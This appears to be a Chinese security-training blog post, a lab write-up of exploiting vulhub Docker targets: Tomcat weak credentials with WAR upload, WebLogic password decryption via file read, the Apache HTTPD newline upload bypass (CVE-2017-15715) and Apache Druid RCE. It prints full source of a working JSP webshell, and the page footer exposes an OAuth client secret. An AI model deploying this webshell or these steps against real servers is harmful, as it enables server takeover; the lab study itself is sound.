@@ -1,0 +1,683 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/planet.png">
+  <link rel="icon" href="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/planet.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pasiphae">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、安装docker和docker-compose1.安装docker照着docker官网教程安装即可https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;install&#x2F; 2.git clone项目vulhub切换到普通用户jupiter(但在docker组中)，git clone项目vulhub 12cd ~&#x2F;documents&#x2F;GitClonegit clone https:&#x2F;&#x2F;gi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实训第八天">
+<meta property="og:url" content="https://www.pasiphae.top/2024/09/05/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/index.html">
+<meta property="og:site_name" content="pasiphae&#39;s blog">
+<meta property="og:description" content="一、安装docker和docker-compose1.安装docker照着docker官网教程安装即可https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;install&#x2F; 2.git clone项目vulhub切换到普通用户jupiter(但在docker组中)，git clone项目vulhub 12cd ~&#x2F;documents&#x2F;GitClonegit clone https:&#x2F;&#x2F;gi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/uranus2.jpg">
+<meta property="article:published_time" content="2024-09-05T05:57:04.000Z">
+<meta property="article:modified_time" content="2025-03-16T12:45:17.140Z">
+<meta property="article:author" content="pasiphae">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/uranus2.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>实训第八天 - pasiphae&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_4627722_bg34xk7tmbs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.pasiphae.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":60,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pasiphae&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/SolarSystem.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="实训第八天"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-05 13:57" pubdate>
+          2024年9月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span>次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">实训第八天</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、安装docker和docker-compose"><a href="#一、安装docker和docker-compose" class="headerlink" title="一、安装docker和docker-compose"></a>一、安装docker和docker-compose</h2><p>1.安装docker<br>照着docker官网教程安装即可<br><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install/</a><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/1.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>2.git clone项目vulhub<br>切换到普通用户jupiter(但在docker组中)，git clone项目vulhub</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/documents/GitClone<br>git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure>
+
+<h2 id="二、Tomcat7-弱口令-后台getshell漏洞"><a href="#二、Tomcat7-弱口令-后台getshell漏洞" class="headerlink" title="二、Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>二、Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h2><p>1.切换到目录<code>~/documents/GitClone/vulhub/tomcat/tomcat8</code>，查看下docker-compose.yml文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/tomcat/tomcat8<br><span class="hljs-built_in">cat</span> docker-compose.yml<br></code></pre></td></tr></table></figure>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/3.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>我们换一个不常见的端口8383，防止被黑客攻击消耗VPS的流量<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/5.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>2.没啥问题，创建并开启容器</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker compose <span class="hljs-keyword">up</span> --detach<br>docker <span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/4.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>可以看到，成功启动了</p>
+<p>3.转到192.168.163.1，用浏览器访问<code>http://venus.pasiphae.top:8383/</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/6.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>访问成功</p>
+<p>4.访问tomcat管理页面<code>/manager/html</code>，尝试弱口令，试出弱口令tomcat&#x2F;tomcat。同时发现后台还存在war文件上传功能<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/7.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h3 id="5-漏洞原理"><a href="#5-漏洞原理" class="headerlink" title="5.漏洞原理"></a>5.漏洞原理</h3><p>这里了解一下war文件<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/8.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>当我们把xxx.war上传到tomcat后，<strong>tomcat会自动解压并部署web应用</strong>，且其内部的文件路径是不变的</p>
+<p>那我们可以把一个一句话木马what.jsp文件塞进where.war中，那么就可以通过&#x2F;where&#x2F;what.jsp访问这个一句话木马了<br>what.jsp内容，连接密码passwd</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;%!<br>    <span class="hljs-keyword">class</span> U <span class="hljs-keyword">extends</span> ClassLoader &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-keyword">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">Class</span> g(<span class="hljs-keyword">byte</span>[] b) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.<span class="hljs-keyword">class</span>).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            Object decoder = clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-keyword">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.<span class="hljs-keyword">class</span>).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String cls = request.getParameter(<span class="hljs-string">&quot;passwd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> U(<span class="hljs-keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>6.将下图中目录下所有文件打包生成where.war</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">jar</span></span> -cvf ..\where.war *<br></code></pre></td></tr></table></figure>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/9.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>7.上传where.war到tomcat，此时后台多出了一个where目录而且能访问到<code>/where/what.jsp</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/10.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/11.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>8.转到kali 192.168.163.138，用蚁剑进行连接<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/12.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/13.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>连接成功</p>
+<h2 id="三、Weblogic-常规渗透测试环境"><a href="#三、Weblogic-常规渗透测试环境" class="headerlink" title="三、Weblogic 常规渗透测试环境"></a>三、Weblogic 常规渗透测试环境</h2><p>1.先了解下weblogic是什么<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/17.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>2.销毁上一步生成的容器</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose down</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/14.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>3.转到相应目录<code>~/documents/GitClone/vulhub/weblogic/weak_password</code>，查看下docker-compose.yml<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/15.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>这次端口不常见，就不修改了</p>
+<p>4.创建并启动容器<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/16.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>5.转到192.168.163.1，假设我们通过前期工作知道网站的后台路径为<code>/console</code>，同时知道在<code>/hello/file.jsp?path=xxx</code>存在<strong>任意文件读取漏洞</strong>，我们此时想通过任意文件读取获得后台的用户名&#x2F;密码</p>
+<h3 id="6-漏洞原理"><a href="#6-漏洞原理" class="headerlink" title="6.漏洞原理"></a>6.漏洞原理</h3><p>而weblogic使用AES加解密，只需要找到<strong>密钥文件SerializedSystemIni.dat</strong>和<strong>加密后的密码所在文件config.xml</strong>就能解出密码明文进行登录。此题假设经过前期工作，知道了二者的相对路径<code>./security/SerializedSystemIni.dat</code>和<code>./config/config.xml</code></p>
+<p>6.通过BurpSuite得到这两个文件<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/18.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/19.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>转到192.168.163.1，下载<code>http://venus.pasiphae.top:7001/decrypt/weblogic_decrypt.jar</code>，用于AES加解密</p>
+<p>最终解密出用户<code>weblogic</code>的密码为<code>Oracle@123</code></p>
+<p>7.登录后台<code>http://venus.pasiphae.top:7001/console</code><br>这里我每次登录后台后，点击任意链接都会返回后台登录页面，也不知道为什么，暂时先搁置在这里</p>
+<h2 id="四、Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#四、Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="四、Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>四、Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>1.销毁掉上步创建的容器，切换到目录<code>~/documents/GitClone/vulhub/httpd/CVE-2017-15715</code><br>查看下docker-compose.yml文件<br>修改下映射的端口为8383，防止黑客攻击消耗流量</p>
+<p>2.这次要先编译，然后再启动容器</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker compose build<br>docker compose up <span class="hljs-comment">--detach</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/21.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>3.访问<code>http://venus.pasiphae.top:8383/</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/22.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>4.上传个PHP一句话木马试试<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/23.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/24.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>bad file，说明不能上传php文件</p>
+<h3 id="5-漏洞原理-1"><a href="#5-漏洞原理-1" class="headerlink" title="5.漏洞原理"></a>5.漏洞原理</h3><p>此题的网站用的apache2，同时用了mod_php模块对php文件进行处理。在其配置文件<code>/etc/apache2/conf-enable/docker-php.conf</code>中存在如下正则表达式<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/25.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>这里有一个<code>$</code>，它是用来匹配字符串结尾位置的，而且如果设置了RegExp对象(正则表达式)的 Multiline(&#x2F;m) 属性，则<code>$</code>也匹配<code>\n</code>或<code>\r</code><br>所以如果我们设置了RegExp对象的Multiline属性(\m)的条件下，<code>$</code>还会匹配到字符串结尾的换行符(也就是%0a),于是也就产生了这么一个换行解析漏洞</p>
+<p>6.我们再次上传which.php，但这次用burpsuite进行拦截修改报文<br>注意是在标箭头的which.php后面加上<code>\n即0x0A</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/26.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>可以看到，服务器响应200 OK</p>
+<p>7.转到192.168.163.1，访问下<code>which.php</code>，然后这里的上传目录就是根目录，<code>http://venus.pasiphae.top:8383/which.php%0A</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/27.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>可以看到能访问到</p>
+<p>8.用蚁剑连接<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/28.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h2 id="五、Apache-Druid-代码执行漏洞（CVE-2021-25646）"><a href="#五、Apache-Druid-代码执行漏洞（CVE-2021-25646）" class="headerlink" title="五、Apache Druid 代码执行漏洞（CVE-2021-25646）"></a>五、Apache Druid 代码执行漏洞（CVE-2021-25646）</h2><p>1.销毁上一步生成的容器<br>切换到目录<code>~/documents/GitClone/vulhub/httpd/CVE-2017-15715</code>，查看下docker-compose.yml文件<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/29.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>2.创建并启动容器<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/30.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/31.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>3.使用BP进行抓包并修改包<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E5%85%AB%E5%A4%A9/32.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br>最终成功执行id命令</p>
+<h2 id="六、RCE漏洞"><a href="#六、RCE漏洞" class="headerlink" title="六、RCE漏洞"></a>六、RCE漏洞</h2><p>RCE，Remote Code Execute，远程代码执行。黑客能够在受害者的主机上执行恶意代码，导致数据泄露甚至被获取最高权限</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>不安全的输入处理:例如，web应用未正确处理用户输入，使得攻击者能够注入恶意代码</li>
+<li>依赖库或第三方组件漏洞:使用存在漏洞的第三方库或组件，攻击者可以通过已知的漏洞触发 RCE</li>
+<li>不当的权限配置:系统或应用程序未正确配置权限，使得攻击者能够执行高级命令</li>
+</ul>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul>
+<li>输入验证和过滤:严格验证和过滤用户输入，防止恶意代码注入。</li>
+<li>最小权限原则:应用程序和系统仅授予必要的权限，防止代码执行超出预期范围。</li>
+<li>使用安全编码实践:遵循安全的编码规范，避免常见的编程错误(如缓冲区溢出、SQL 注入)</li>
+<li>及时更新和打补丁:保持系统和软件的最新状态，及时修复已知的安全漏洞</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>实训第八天</div>
+      <div>https://www.pasiphae.top/2024/09/05/实训第八天/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>pasiphae</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"Ov23liLrR5TiUqomlpen","clientSecret":"8f84493c225143d48a06471c47289a42d61008ae","repo":"pasiphae321.github.io","owner":"pasiphae321","admin":["pasiphae321"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '6700a2bfa004c5d871784e7c116118d1'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
